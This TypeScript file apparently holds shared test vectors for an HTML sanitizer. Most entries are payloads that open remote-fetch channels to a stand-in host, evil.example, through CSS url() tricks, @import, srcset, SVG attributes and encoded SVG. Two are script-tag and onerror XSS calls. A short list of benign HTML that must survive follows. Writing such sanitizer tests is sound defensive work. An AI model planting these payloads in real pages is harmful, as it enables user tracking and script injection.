// Shared attack + keep vectors for the topic sanitizer (web + native).
// "leaks(out)" is true if the fetch channel SURVIVES the sanitized output.
export interface SanitizeVector {
  name: string;
  html: string;
  leaks: (out: string) => boolean; // true = STILL a fetch channel (a failure)
}

const evil = (o: string) => o.includes("evil.example");

export const ATTACK_VECTORS: SanitizeVector[] = [
  { name: "style attr url()", html: '<div style="background:url(https://evil.example/x.png)">x</div>', leaks: evil },
  { name: "style attr image-set() bare string", html: `<div style="background-image:image-set('https://evil.example/v.png' 1x)">x</div>`, leaks: evil },
  { name: "style attr var() indirection", html: `<div style="--a:'https://evil.example/v.png';background-image:image-set(var(--a) 1x)">x</div>`, leaks: evil },
  { name: "style attr CSS-escape \\75 rl(", html: `<div style="background:\\75 rl(https://evil.example/x.png)">x</div>`, leaks: evil },
  { name: "<style> @import", html: '<p>a</p><style>@import url("https://evil.example/x.css");</style><p>b</p>', leaks: evil },
  { name: "srcset remote candidate", html: '<img src="data:image/png;base64,AAA=" srcset="https://evil.example/2x.png 2x">', leaks: evil },
  { name: "SVG fill=url()", html: '<svg><rect fill="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "SVG filter=url()", html: '<svg><rect filter="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "SVG mask=url()", html: '<svg><rect mask="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "table background= attr", html: '<table><tr background="https://evil.example/tr.png"><td>x</td></tr></table>', leaks: evil },
  { name: "data:svg with nested remote <image>", html: `<img src="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>').toString("base64")}">`, leaks: evil },
  { name: "external img src", html: '<img src="https://evil.example/track.png">', leaks: evil },
  { name: "script tag (XSS)", html: '<p>a</p><script>fetch("https://evil.example/x")</script>', leaks: (o) => o.includes("<script") || evil(o) },
  { name: "img onerror handler (XSS)", html: '<img src="x" onerror="fetch(\'https://evil.example/x\')">', leaks: (o) => o.includes("onerror") || evil(o) },
];

export const KEEP_VECTORS: { name: string; html: string; survives: (o: string) => boolean }[] = [
  { name: "animated SVG fill=url(#local) gradient", html: '<svg><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><rect fill="url(#g)" width="1" height="1"><animate attributeName="opacity" dur="1s" values="0;1"/></rect></svg>', survives: (o) => o.includes("url(#g)") && o.includes("<animate") },
  { name: "data: figure image", html: '<img src="data:image/png;base64,iVBORw0KGgo=" alt="fig">', survives: (o) => o.includes("data:image/png") && o.includes('alt="fig"') },
  { name: "plain colour fill", html: '<svg><rect fill="#ff0000" width="1" height="1"/></svg>', survives: (o) => o.includes('fill="#ff0000"') },
  { name: "prose + heading + table", html: '<h2>Title</h2><p>Body text.</p><table><tr><td>cell</td></tr></table>', survives: (o) => o.includes("Body text.") && o.includes("<td>cell</td>") },
  { name: "#fragment anchor (footnote)", html: '<a href="#fn1">1</a>', survives: (o) => o.includes('href="#fn1"') },
];
